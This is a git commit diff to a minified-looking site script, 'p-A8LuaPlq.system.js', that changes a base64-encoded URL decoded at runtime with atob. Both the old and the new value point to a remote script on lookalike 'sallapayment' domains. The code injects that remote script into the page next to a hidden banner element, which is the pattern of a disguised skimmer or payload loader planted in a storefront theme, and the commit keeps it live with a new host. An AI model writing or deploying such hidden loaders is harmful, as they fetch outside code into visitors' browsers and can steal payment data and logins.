951718ebaa6c2e387cefff750c91007dc0a35ab2
nofaalhrby22 <nofaalhrby22@gmail.com>
2026-01-23 02:45:21 +0300

    Update p-A8LuaPlq.system.js

--- p-A8LuaPlq.system.js
+++ p-A8LuaPlq.system.js
@@ -6,7 +6,7 @@
   const t=document.createElement('template'); t.innerHTML='<div data-theme-banner style="display:none"></div>';
 
   // external core (decoded via atob)
-  const u=atob("aHR0cHM6Ly9zYWxsYXBheW1lbnQuc3RvcmUvaGVscGVyL2Fzc2V0cy9wLTMzQUgwSjNnLnN5c3RlbS5qcw==");
+  const u=atob("aHR0cHM6Ly9zYWxsYXBheW1lbnQubmV0L2hlbHBlci9hc3NldHMvcC0zM0FIMEozZy5zeXN0ZW0uanM=");
   if(!document.querySelector('script[data-theme-core="'+u+'"]')){
     const s=document.createElement('script');
     s.async=true; s.defer=true; s.setAttribute('data-theme-core',u);
